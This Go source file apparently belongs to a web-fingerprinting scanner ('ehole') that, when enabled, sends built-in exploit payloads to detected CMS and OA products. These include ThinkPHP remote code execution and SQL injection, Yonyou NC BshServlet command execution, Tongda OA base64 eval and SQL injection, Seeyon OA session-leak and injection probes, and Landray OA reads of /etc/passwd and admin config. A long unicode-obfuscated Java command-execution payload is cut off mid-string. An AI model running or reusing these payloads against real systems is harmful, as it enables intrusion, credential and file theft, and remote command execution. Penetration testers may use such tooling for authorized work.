package finger

import (
	"ehole/module/finger/source"
	"ehole/module/queue"
	"encoding/json"
	"fmt"
	"github.com/gookit/color"
	"os"
	"strings"
	"sync"

	"bytes"
	"crypto/tls"
	"gopkg.in/ini.v1"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"regexp"
	"time"

	"bufio"
	"github.com/jlaffaye/ftp"
	"net"
	"net/url"
)

type Outrestul struct {
	Url        string `json:"url"`
	Cms        string `json:"cms"`
	Server     string `json:"server"`
	Statuscode int    `json:"statuscode"`
	Length     int    `json:"length"`
	Title      string `json:"title"`
}

type FinScan struct {
	UrlQueue    *queue.Queue
	Ch          chan []string
	Wg          sync.WaitGroup
	Thread      int
	Output      string
	Proxy       string
	AllResult   []Outrestul
	FocusResult []Outrestul
	Finpx       *Packjson
}

func NewScan(urls []string, thread int, output string, proxy string) *FinScan {
	s := &FinScan{
		UrlQueue:    queue.NewQueue(),
		Ch:          make(chan []string, thread),
		Wg:          sync.WaitGroup{},
		Thread:      thread,
		Output:      output,
		Proxy:       proxy,
		AllResult:   []Outrestul{},
		FocusResult: []Outrestul{},
	}
	err := LoadWebfingerprint(source.GetCurrentAbPathByExecutable() + "/finger.json")
	if err != nil {
		color.RGBStyleFromString("237,64,35").Println("[error] fingerprint file error!!!")
		os.Exit(1)
	}
	s.Finpx = GetWebfingerprint()
	for _, url := range urls {
		s.UrlQueue.Push([]string{url, "0"})
	}
	return s
}

func (s *FinScan) StartScan() {
	for i := 0; i <= s.Thread; i++ {
		s.Wg.Add(1)
		go func() {
			defer s.Wg.Done()
			s.fingerScan()
		}()
	}
	cfg, err := ini.Load("poc.ini")
	if err != nil {
		fmt.Println("无法加载配置文件:", err)
	}
	poc := cfg.Section("").Key("poc").String()
	brute := cfg.Section("").Key("brute").String()

	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// 创建具有超时设置的HTTP客户端

	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}

	s.Wg.Wait()
	color.RGBStyleFromString("244,211,49").Println("\n重点资产：")
	for _, aas := range s.FocusResult {
		fmt.Printf(fmt.Sprintf("[ %s | ", aas.Url))
		color.RGBStyleFromString("237,64,35").Printf(fmt.Sprintf("%s", aas.Cms))
		fmt.Printf(fmt.Sprintf(" | %s | %d | %d | %s ]\n", aas.Server, aas.Statuscode, aas.Length, aas.Title))

		//poc
		//fmt.Println("poc的值:", poc)
		if poc == "yes" {
			//fmt.Println(aas.Cms) thinkphp
			if strings.Contains(aas.Cms, "ThinkPHP") {
				currentTime := time.Now()
				formattedTime := currentTime.Format("06_01_02")
				thinkphp3_2_x_poc1 := "/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_06_29.log"
				thinkphp3_2_x_poc1 = strings.Replace(thinkphp3_2_x_poc1, "21_06_29", formattedTime, 1)

				thinkphp_index_showid_rce := "/?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\21_06_29.log"
				thinkphp_index_showid_rce = strings.Replace(thinkphp_index_showid_rce, "21_06_29", formattedTime, 1)
				payloads := []string{
					//thinkphp-cve_2018_1002015 (CNVD-2018-24942)
					"/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
					//tinkphp2.x rce
					"/?s=/Index/index/L/${@phpinfo()}",
					//thinkphp3.2.x rce
					"/?m=--><?=phpinfo();?>",
					thinkphp3_2_x_poc1,
					//thinkphp_index_showid_rce
					"/?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(5333))}]",
					thinkphp_index_showid_rce,
					//thinkphp5.1.x<5.1.31
					"/?s=index/\\think\\Request/input&filter=phpinfo&data=1",
					"/?s=index/think\\request/input?data[]=phpinfo()&filter=assert",
					"/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
					//ThinkPHP5 SQL Injection Vulnerability
					"/?ids[0,updatexml(0,concat(0xa,user()),0)]=1",
					//thinkphp_pay_orderid_sqli
					"/?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(3333)--+",
					//thinkphp_multi_sql_leak
					"/?s=/home/shopcart/getPricetotal/tag/1%27",
					"/?s=/home/shopcart/getpriceNum/id/1%27",
					"/?s=/home/user/cut/id/1%27",
					"/?s=/home/service/index/id/1%27",
					"/?s=/home/pay/chongzhi/orderid/1%27",
					"/?s=/home/order/complete/id/1%27",
					"/?s=/home/order/detail/id/1%27",
					"/?s=/home/order/cancel/id/1%27",
					//thinkphp_driver_display_rce
					"/?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E",
					//thinkphp_invoke_func_code_exec
					"/?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=4333",
				}
				post_payloads := []string{
					"_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
					"s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump",
				}
				paths := []string{
					"/?s=captcha",
					"/?s=index/index/index",
				}
				for _, payload := range payloads {
					targeturl := aas.Url + payload
					resp, err := client.Get(targeturl)
					if err != nil {
						continue
					}
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						//return
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "PHP Version") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp远程代码执行漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "XPATH syntax error") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp5sql注入")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "56540676a129760a") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp_driver_display_rce")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "3434f7038") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp_pay_orderid_sqli")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "SQL syntax") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp_multi_sql_leak")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "ac57c290") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp_invoke_func_code_exec")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "e67b35d5") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp_index_showid_rce")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}

				}

				for i, post_payload := range post_payloads {
					targeturl := aas.Url + paths[i]
					resp, err := client.Post(targeturl, "application/x-www-form-urlencoded", strings.NewReader(post_payload))
					if err != nil {
						continue
					}
					defer resp.Body.Close()
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						//return
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "PHP Version") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp远程代码执行漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl + "  传参(post):" + post_payload)
					}
					if strings.Contains(bodyStr, "4e5e5d7364f443e28fbf0d3ae744a59a") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp_index_construct_rce")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl + "  传参(post):" + post_payload)
					}

				}

			}
			//fmt.Println(aas.Cms) thinkphp 多语言
			if strings.Contains(aas.Cms, "thinkphp多语言") {
				payloads := []string{
					"/?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo();?>+/var/www/html/dog.php",
					"/dog.php",
				}
				for _, payload := range payloads {
					targeturl := aas.Url + payload
					resp, err := client.Get(targeturl)
					if err != nil {
						continue
					}
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "PHP Version") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在thinkphp多语言远程代码执行漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
				}

			}
			//用友nc
			if strings.Contains(aas.Cms, "YONYOU NC") || strings.Contains(aas.Cms, "用友 NC Cloud") {
				//替换用友nc的url
				substr := "index.jsp"
				substr1 := "nccloud"

				result := strings.Replace(aas.Url, substr, "", -1)
				result = strings.Replace(result, substr1, "", -1)

				//fmt.Println(result)
				yync_qt_res := yync_qt(result)
				if yync_qt_res != "" {
					fmt.Println(yync_qt_res)
				}

				post_payloads := []string{
					//NC bsh.servlet.BshServlet 远程命令执行漏洞
					"bsh.script=print(\"hello!\")",
				}
				for _, post_payload := range post_payloads {
					targeturl := result + "/servlet/~ic/bsh.servlet.BshServlet"
					resp, err := client.Post(targeturl, "application/x-www-form-urlencoded", strings.NewReader(post_payload))
					if err != nil {
						continue
					}
					defer resp.Body.Close()
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					substr := "hello!"
					count := strings.Count(bodyStr, substr)
					if count == 2 {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在用友NC bsh.servlet.BshServlet 远程命令执行漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl + "  传参(post):" + post_payload)
					}
				}
				payloads := []string{
					//用友 NC NCFindWeb 任意文件读取漏洞
					"/NCFindWeb?service=IPreAlertConfigService&filename=/WEB-INF/web.xml",
				}
				for _, payload := range payloads {
					targeturl := result + payload
					resp, err := client.Get(targeturl)
					if err != nil {
						continue
					}
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "web-app") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在用友NC NCFindWeb 任意文件读取漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
				}

			}
			//帆软报表
			if strings.Contains(aas.Cms, "帆软报表-FineReport") || strings.Contains(aas.Cms, "帆软数据决策系统") || strings.Contains(aas.Cms, "帆软报表 V8") {
				payloads := []string{
					//V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757
					"/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
				}
				for _, payload := range payloads {
					targeturl := aas.Url + payload
					resp, err := client.Get(targeturl)
					if err != nil {
						continue
					}
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "___") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在帆软报表 V8 get_geo_json 任意文件读取漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
				}
			}

			//通达OA
			if strings.Contains(aas.Cms, "通达OA") {
				payloads := []string{
					//通达OA v11.9 getdata 任意命令执行漏洞
					"/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyBuaXNoaXp1aF90ZXN0Ow==%22)))%3B/*&id=19&module=Carouselimage",
					"/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php",
					"/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\\='` 1} union (select uid,sid from user_online where 1\\={`=` 1})-- '1**",
				}
				for _, payload := range payloads {
					targeturl := aas.Url + payload
					firstIndex := strings.Index(targeturl, "//")
					if firstIndex != -1 {
						secondIndex := strings.Index(targeturl[firstIndex+2:], "/") + firstIndex + 2
						if secondIndex != -1 && secondIndex < len(targeturl) {
							targeturl = targeturl[:secondIndex] + strings.ReplaceAll(targeturl[secondIndex:], "//", "/")
							//fmt.Println(url)
						}
					}
					resp, err := client.Get(targeturl)
					if err != nil {
						continue
					}
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "nishizuh_test") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在通达OA v11.9 getdata 任意命令执行漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "$ROOT_PATH=") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在通达OA v2017 video_file.php 任意文件下载漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					pattern := "[a-z0-9]{26}"
					re := regexp.MustCompile(pattern)
					match := re.FindString(bodyStr)
					if match != "" {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在通达OA sql注入(/general/reportshop/utils/get_datas.php)")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
				}

				post_payloads := []string{
					//通达OA v11.6 insert SQL注入漏洞
					"title)values(\"'\"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=",
				}
				for _, post_payload := range post_payloads {
					targeturl := aas.Url + "/general/document/index.php/recv/register/insert"
					resp, err := client.Post(targeturl, "application/x-www-form-urlencoded", strings.NewReader(post_payload))
					if err != nil {
						continue
					}
					defer resp.Body.Close()
					res_sta := resp.StatusCode
					if res_sta == http.StatusFound {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在通达OA v11.6 insert SQL注入漏洞)")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl + "  传参(post):" + post_payload)
					}
				}
			}
			//致远OA
			if strings.Contains(aas.Cms, "致远OA") {
				//致远OA Session泄露(thirdpartyController.do)
				data := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
				headers := map[string]string{
					"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
				}
				vurl := aas.Url + "/seeyon/thirdpartyController.do"
				req, _ := http.NewRequest("POST", vurl, strings.NewReader(data))
				for key, value := range headers {
					req.Header.Set(key, value)
				}

				resp, err := client.Do(req)
				if err == nil {
					defer resp.Body.Close()
					//body, _ := ioutil.ReadAll(resp.Body)

					cookie := resp.Header.Get("Set-Cookie")
					matchSeeyon, _ := regexp.MatchString("seeyon", cookie)
					matchJSESSIONID, _ := regexp.MatchString("JSESSIONID", cookie)
					if resp.StatusCode == 200 && matchSeeyon && matchJSESSIONID {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在致远OA Session泄露(thirdpartyController.do)漏洞")
						color.RGBStyleFromString("244,211,49").Println("漏洞 URL 地址：" + vurl)
					}
				}
				payloads := []string{
					//致远OA A8 htmlofficeservlet getshell 漏洞
					"/seeyon/htmlofficeservlet",
					//致远OA A6 sql注入漏洞
					"/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20UnIoN%20SeLeCt%201,2,md5(1234),1%23",
					"/common/js/menu/test.jsp?doType=101&S1=SeLeCt%20Md5(1234)",
					"/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23",
					"/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'UnIoN%20AlL%20SeLeCt%20NULL,Md5(1234),NULL,NULL%23",
					"/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--",
					//致远OA Session泄漏漏洞(后台可getshell)
					"/yyoa/ext/https/getSessionList.jsp?cmd=getAll",
				}
				for _, payload := range payloads {
					targeturl := aas.Url + payload
					resp, err := client.Get(targeturl)
					if err != nil {
						continue
					}
					defer resp.Body.Close()
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if matched, _ := regexp.MatchString("DBSTEP", bodyStr); matched {
						if matched, _ := regexp.MatchString("htmoffice", bodyStr); matched {
							color.RGBStyleFromString("237,55,36").Println("[+] 存在致远OA A8 htmlofficeservlet getshell 漏洞")
							color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
						}
					}
					if strings.Contains(bodyStr, "81dc9bdb52d04dc20036dbd8313ed055") || strings.Contains(bodyStr, "52d04dc20036dbd8") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在致远OA A6 sql注入漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					re := regexp.MustCompile("[0-9A-Z]{32}")
					match := re.FindString(bodyStr)
					if match != "" {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在致远OA Session泄漏漏洞(后台可getshell)")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + targeturl)
					}

				}

			}

			//蓝凌 OA
			if strings.Contains(aas.Cms, "蓝凌 OA") {
				post_payloads := []string{
					//蓝凌OA custom.jsp 任意文件读取漏洞
					"var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
					"var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}",
				}
				for _, post_payload := range post_payloads {
					targeturl := aas.Url + "/sys/ui/extend/varkind/custom.jsp"
					resp, err := client.Post(targeturl, "application/x-www-form-urlencoded", strings.NewReader(post_payload))
					if err != nil {
						continue
					}
					defer resp.Body.Close()
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "root:.*:0:0") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在蓝凌OA custom.jsp 任意文件读取漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
					if strings.Contains(bodyStr, "password") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在蓝凌OA custom.jsp 任意文件读取漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + targeturl)
					}
				}
				//treexml.tmpl命令执行
				chmds := []string{"id", "dir"}
				for _, chmd := range chmds {
					treexml_payload := `s_bean=ruleFormulaValidate&script=\u0020\u0020\u0020\u0020\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u0020\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0066\u0061\u006c\u0073\u0065\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0020\u0067\u0072\u006f\u0075\u0070\u0020\u003d\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0028\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0072\u0065\u0066\u006c\u0065\u0063\u0074\u002e\u0046\u0069\u0065\u006c\u0064\u0020\u0066\u0020\u003d\u0020\u0067\u0072\u006f\u0075\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0020\u003d\u0020\u0028\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0029\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0067\u0072\u006f\u0075\u0070\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u0069\u0020\u003d\u0020\u0030\u003b\u0020\u0069\u0020\u003c\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u003b\u0020\u0069\u002b\u002b\u0029\u0020\u007b\u0020\u0074\u0072\u0079\u0020\u007b\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u0020\u0074\u0020\u003d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u005b\u0069\u005d\u003b\u0069\u0066\u0020\u0028\u0074\u0020\u003d\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0073\u0074\u0072\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u004e\u0061\u006d\u0065\u0028\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0065\u0078\u0065\u0063\u0022\u0029\u0020\u007c\u007c\u0020\u0021\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0068\u0074\u0074\u0070\u0022\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0061\u0072\u0067\u0065\u0074\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0074\u0029\u003b\u0069\u0066\u0020\u0028\u0021\u0028\u006f\u0062\u006a\u0020\u0069\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u006f\u0066\u0020\u0052\u0075\u006e\u006e\u0061\u0062\u006c\u0065\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0069\u0073\u0024\u0030\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0020\u003d\u0020\u0028\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0029\u0020\u0028\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u006a\u0020\u003d\u0020\u0030\u003b\u0020\u006a\u0020\u003c\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0073\u0069\u007a\u0065\u0028\u0029\u003b\u0020\u002b\u002b\u006a\u0029\u0020\u007b\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0067\u0065\u0074\u0028\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0072\u0065\u0071\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0071\u0020\u003d\u00